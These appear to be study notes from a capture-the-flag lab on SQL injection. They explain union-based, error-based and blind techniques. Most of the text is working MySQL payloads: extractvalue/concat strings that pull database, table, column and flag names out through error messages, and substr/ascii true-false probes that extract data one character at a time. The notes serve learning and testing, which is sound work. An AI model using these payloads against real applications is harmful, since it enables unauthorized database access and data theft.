## 1. Types of SQL Injection (Union-based, Error-based, Blind)

SQL Injection techniques can generally be categorized into the following three types:

**Union-based SQL Injection**

**Error-based SQL Injection**

**Blind SQL Injection**

### (1) Union-based SQL Injection
Condition: The result of the SQL query is directly displayed on the page.
purpose: Use **UNION SELECT** to append custom queries and extract data by injecting into the output.

``` 
UNION SELECT 1,2,3,4 #
```

→ it is important to match the number of columns 
→ You can insert values into visible columns to leak data

### (2) Error-based SQL Injection

Condition: The server displays detailed SQL error messages.
Goal: Trigger an error that includes the result of a **SELECT** query within the error message itself.

Syntax errors are usually not helpful
Logic errors are more effective for exposing data in the error

Recommended function: __extractvalue()__

``` 
extractvalue('1', concat(0x3a, (select 'normaltic')))
``` 
Attack Format:

``` 
' AND extractvalue('1', concat(0x3a, (SQL))) AND '1'='1
``` 
Typical Steps:

Get the database name
→ SELECT database()

Get table names
→ SELECT table_name FROM information_schema.tables WHERE table_schema='segfault_sql' LIMIT 0,1

Get column names
→ SELECT column_name FROM information_schema.columns WHERE table_name='game' LIMIT 0,1

### (3) Blind SQL Injection

Condition: No data is printed, and no error messages are shown (the response differs only by true/false conditions).

Goal: Extract data by asking true/false questions and observing changes in the server's response.

Basic Format:

``` 
' AND (condition) AND '1'='1
```

Example:

``` 
' AND substr((select 'test'), 1,1) = 't' AND '1'='1
```

Useful Functions:
- substr(string, position, length) → Extract part of a string
- ascii(char) → Get ASCII code of a character
- SELECT database() → Get current database name

## 2. Process of Error Based Injection 
To use error-based SQL injection, we first need to trigger a logical error in the backend.

Before that, let’s understand the difference between syntax errors and logical errors.

- Syntax Error
: Occurs when a query violates SQL grammar rules.
For example: **select * from games where name = '$over**
This query is missing a closing quote ('), which makes it invalid SQL and prevents execution.

- Logical Error
: Occurs when the query is syntactically valid, but the logic or intended behavior is broken.
For example: **SELECT * FROM users WHERE username = '$user' OR 1=1;**
The query is technically correct, but OR 1=1 always returns true, causing the database to return all users, which defeats the intended purpose.


Just like UNION-based injection, error-based injection can also be broken down into a 7-step process to extract data.



### Step 1. Find the Error Based Injection Point
 You can identify whether your input is injected into the SQL query by trying a single quote **'** and observing how the server reacts.
  ![image](https://github.com/user-attachments/assets/de405a18-815a-4e39-9cbd-e5a321a39509)
### Step 2. Choose a Function that Outputs an Error
In this case, we’ll use the extractvalue(xml, xpath_expr) function.
extractvalue() function:
- First argument: XML string
- Second argument: XPath expression (used to extract a value from the XML)
Example XML:
``` 
<user>
  <name>Jimin</name>
</user>
```
Query:
```
extractvalue(xml_string, '/user/name')
-- Returns: Jimin
```

However, instead of using it correctly, we’ll use it **incorrectly** on purpose to force an error message. If the website is configured to show SQL error messages, we can inject our desired value into the error message itself..

How to Trigger the Error?
We intentionally pass a malformed XPath expression as the second argument:

``` 
extractvalue('1', ':abc')
```

Since **:abc** is not valid XPath, this triggers -> **XPATH syntax error: ':abc'** 
Now, we can replace abc with any value we want to extract — and it will be revealed inside the error message.

### Step 3. Create the Injection Format

Initially, you might think the following works: normaltic' AND extractvalue('1', (SELECT '____')) AND '1'='1
But this doesn't actually cause an error — XPath must be malformed.
You might then try: normaltic' AND extractvalue('1', :(SELECT 'value')) AND '1'='1
But this results in SQL syntax error due to the : operator, which is invalid in MySQL.
Correct approach is to use concat() to merge values and trigger a parsing error inside XPath: normaltic' AND extractvalue('1', concat(0x3a, (SELECT 'value'))) AND '1'='1
The reason for appending AND '1'='1' is to balance the final quote and avoid breaking SQL syntax.

Final Attack Format:
``` 
normaltic' and extractvalue('1', concat(0x3a, (select 'test'))) and '1'='1
normaltic' and extractvalue('1', concat(0x3a, (select '_______'))) and '1'='1
```

### Step 4. Get DB name
Now that we have a working payload format, we can extract data. For example, to get the current database name:
``` 
normaltic' and extractvalue('1', concat(0x3a, (select database()))) and '1'='1
``` 
![image](https://github.com/user-attachments/assets/18c23230-20ed-42bf-a699-6736a8c75a03)

### Step 5. Get Table name
Just like in UNION injection, you can use information_schema.tables to list table names.
``` 
normaltic' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli'))) and '1'='1
```
![image](https://github.com/user-attachments/assets/a702e4ec-23fd-4876-ad94-fbee5656a26e)
Because SELECT table_name returns multiple rows, which concat() and extractvalue() can’t handle. Fix it by limiting to one row:

``` 
normaltic' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli' limit 0,1))) and '1'='1
```
![image](https://github.com/user-attachments/assets/077d5b9c-3713-4d6d-b4ce-587946b52473)

### Step 6. Get column name
Using the same method with information_schema.columns, we can extract column names:

``` 
normaltic' and extractvalue(1, concat(0x3a, ( select column_name from information_schema.columns where table_name='flagTable'limit 0,1))) and '1'='1
```

![image](https://github.com/user-attachments/assets/d48916ca-a473-4eb8-8991-9fbb77e5cdac)

### Step 7. Extract Data (FLAG)
Finally, let’s extract actual data — for example, a flag from the flag column:
```
normaltic' and extractvalue(1, concat(0x3a, (select flag from flagTable limit 0,1))) and '1'='1
``` 
![image](https://github.com/user-attachments/assets/f2df5eb6-8462-423d-b599-3c404674abc4)

Flag successfully extracted.


## 3. Process of Blind SQL Injection 

Blind SQL Injection is a technique used to extract information from a database when error messages are not displayed. It relies on differences in the website’s response depending on whether a condition is true or false.

Input 1: normaltic' and '1'='1
![image](https://github.com/user-attachments/assets/ee263dd7-7b1d-4d39-a843-ed6a5b956c72)
→ The condition is true, so the website responds normally.

Input 2: normaltic' and '1'='2
![image](https://github.com/user-attachments/assets/659de079-32bf-4332-8a58-f32bebe658c2)
→ The condition is false, so the result is different or missing.

By comparing these two cases, we can confirm that the server behaves differently based on true/false conditions.
This behavioral difference is then used to extract information one piece at a time, which is the core concept of Blind SQL Injection.


### Step 1. Find the Blind Injection Point

input 1 과 input 2를 각각 삽입했을때의 결과가 다른것을 근거로 응답 차이를 통해 참/거짓을 구분할 수 있는 환경이란 것을 알 수 있다.

### Step 2. select문을 사용하여 참/거짓 판멸 가능 유무 체크

We can test if a SELECT statement inside the condition is evaluated properly by using a known comparison, such as:
```
normaltic' and ((select 'test') = 'test') and '1'='1
```
![image](https://github.com/user-attachments/assets/e4ae5f57-9e54-4e9d-9cfd-47dd357841fe)
In this case, the inner SELECT 'test' returns 'test', and the condition 'test' = 'test' is true. 
As a result, the page responds normally, confirming that SELECT statements can be used in logical conditions.

### Step 3. Attack Format 만들기

To extract data from a database in an environment where output is not displayed, we need to apply conditions one character at a time and determine whether the result is true or false.
In other words, the goal is to keep testing "Is the first character of this string a?" "Is it b?" Until we ultimately figure out the entire string

#### Use SELECT to retrieve values
```
normaltic' and ((select 'test') = 'test') and '1'='1
```
As shown above, we can use a SELECT statement to retrieve a specific value.
However, in Blind SQL Injection, we cannot compare an entire string all at once, so we must split it into individual characters and check them one by one.

#### Use substr() to compare one character at a time
what is substr(str, pos, len)?
It is an SQL function that extracts a substring from a given string, starting at a specific position and with a specified length.
It is essential for comparing characters one by one.

For example:
```
substr('test', 1, 1) → 't'
substr('test', 2, 1) → 'e'
substr((select database()), 1, 1) → 'u'  (ex: database() is 'user')
```
Now we can guess each character like this:
```
normaltic' and substr((select password from user where id='normaltic'), 1, 1) = 'a'and '1'='1   
```
However, directly comparing characters like this is inefficient because there are too many possibilities (uppercase letters, lowercase letters, digits, special characters).
The number of required attempts increases significantly.

#### Use ascii() for efficient comparison
If we convert characters to numbers using ASCII codes, we can perform range comparisons like > or <, which allows for more efficient value guessing.
```
ascii('a') → 97  
ascii('b') → 98  
ascii('A') → 65  
ascii('1') → 49
```
Now, the attack format becomes
```
normaltic' and (ascii(substr((select ______________), 1, 1)) > n and '1'='1
'n' is an integer
```

substr((select database()), 1, 1) ='b' Ascii로 98
substr((select database()), 2, 1) ='l' Ascii로 108
substr((select database()), 3, 1) ='i' Ascii 로 105
substr((select database()), 4, 1) ='n' Ascii 로 110
substr((select database()), 5, 1) ='d' Ascii 로 100
substr((select database()), 6, 1) ='S' Ascii 로 83
substr((select database()), 7, 1) ='q' Ascii 로 113
substr((select database()), 8, 1) ='l' Ascii 로 108
substr((select database()), 9, 1) ='i' Ascii 로 105
DB이름은 'blindSqli'로 확정되었다.

substr((select database()), 10, 1)은 0보다 크지 않으므로 존재하지 않는다.
